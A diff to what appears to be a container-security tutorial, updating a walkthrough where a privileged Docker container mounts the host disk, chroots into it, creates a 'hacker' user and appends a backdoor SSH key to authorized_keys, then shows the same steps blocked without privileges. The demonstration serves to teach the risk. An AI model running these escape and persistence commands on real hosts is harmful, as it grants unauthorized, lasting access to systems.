@@ -833,7 +833,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 NGINX_VERSION=1.23.4
 NJS_VERSION=0.7.11
 PKG_RELEASE=1~bullseye
-$ curl -s -k https://localhost:443/v2/example-secure/blobs/$cdigest | jq -r '.history[15]'
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$cdigest | jq -r '.history[16]'
 {
   "created": "2023-04-26T00:50:44.615696269Z",
   "created_by": "RUN /bin/sh -c groupadd --gid 53150 -r notroot && useradd -r -g notroot -s \"/bin/bash\" --create-home --uid 53150 notroot # buildkit",
@@ -880,7 +880,7 @@ We'll start by running a standard Ubuntu container with some additional privileg
 to troubleshoot permissions issues:
 
 ```{code-block} console
-$ docker run -it --privileged ubuntu:20.04
+$ docker run -it -e HOME --privileged ubuntu:20.04
 Unable to find image 'ubuntu:20.04' locally
 20.04: Pulling from library/ubuntu
 ca1778b69356: Pull complete
@@ -889,7 +889,7 @@ Status: Downloaded newer image for ubuntu:20.04
 ```
 
 Then, by abusing the additional access from the `--privileged` argument, we can mount the host filesystem, which in my
-example is on `/dev/xvda1`:
+example is on `/dev/nvme0n1p1`:
 
 ```{code-block} console
 ---
@@ -898,16 +898,16 @@ emphasize-lines: 5-7
 $ mount | grep '/dev/'
 devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
 mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
-shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
-/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
-/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,discard)
-/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,discard)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
+/dev/nvme0n1p1 on /etc/resolv.conf type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
+/dev/nvme0n1p1 on /etc/hostname type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
+/dev/nvme0n1p1 on /etc/hosts type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
 devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
 $ ls -al /home # Nothing in the home directory in the container
 total 8
 drwxr-xr-x 2 root root 4096 Apr 15  2020 .
 drwxr-xr-x 1 root root 4096 Apr 26 02:40 ..
-$ mount /dev/xvda1 /mnt
+$ mount /dev/nvme0n1p1 /mnt
 $ chroot /mnt
 ```
 
@@ -918,25 +918,22 @@ anything juicy, and maybe drop a quick backdoor for ourselves later:
 ---
 emphasize-lines: 5,7,9
 ---
-$ ls -al /home # We can now see /home/ubuntu/ on the host filesystem
-total 12
-drwxr-xr-x  3 root   root   4096 Apr 26 00:43 .
-drwxr-xr-x 19 root   root   4096 Apr 26 00:43 ..
-drwxr-xr-x  5 ubuntu ubuntu 4096 Apr 26 00:54 ubuntu
+$ ls -al /home # We can now see /home/ on the host filesystem
+total 4
+drwxr-xr-x  3 root     root       22 Nov 15 17:28 .
+dr-xr-xr-x 18 root     root      257 Nov 15 17:28 ..
+drwx------ 14 ec2-user ec2-user 4096 Nov 26 14:54 ec2-user
 $ sudo useradd hacker
-sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
 $ sudo passwd hacker
-sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
 New password:
 Retype new password:
 passwd: password updated successfully
 ```
 
-Finally, let's drop our public key into the `ubuntu` user's `~/.ssh/authorized_keys` file so there's another way back
-in.
+Finally, let's drop our public key into the current user's `~/.ssh/authorized_keys` file so there's another way back in.
 
 ```{code-block} bash
-echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> /home/ubuntu/.ssh/authorized_keys
+echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> ${HOME}/.ssh/authorized_keys
 exit
 exit
 ```
@@ -945,10 +942,10 @@ Back on the host, we can see evidence of the break-in:
 
 ```{code-block} console
 $ tail -3 /etc/passwd
-ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-hacker:x:1001:1001::/home/hacker:/bin/sh
-$ tail -1 /home/ubuntu/.ssh/authorized_keys
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin
+hacker:x:1001:1001::/home/hacker:/bin/bash
+$ tail -1 "${HOME}/.ssh/authorized_keys"
 ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor
 ```
 
@@ -970,16 +967,16 @@ emphasize-lines: 14
 $ mount | grep '/dev/'
 devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
 mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
-shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
-/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
-/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,discard)
-/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,discard)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
+/dev/nvme0n1p1 on /etc/resolv.conf type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
+/dev/nvme0n1p1 on /etc/hostname type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
+/dev/nvme0n1p1 on /etc/hosts type xfs (rw,noatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
 devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
 $ ls -al /home
 total 8
 drwxr-xr-x 2 root root 4096 Apr 15  2020 .
 drwxr-xr-x 1 root root 4096 Apr 26 02:56 ..
-$ mount /dev/xvda1 /mnt
+$ mount /dev/nvme0n1p1 /mnt
 mount: only root can do that
 $ chroot /mnt
 chroot: cannot change root directory to '/mnt': Operation not permitted
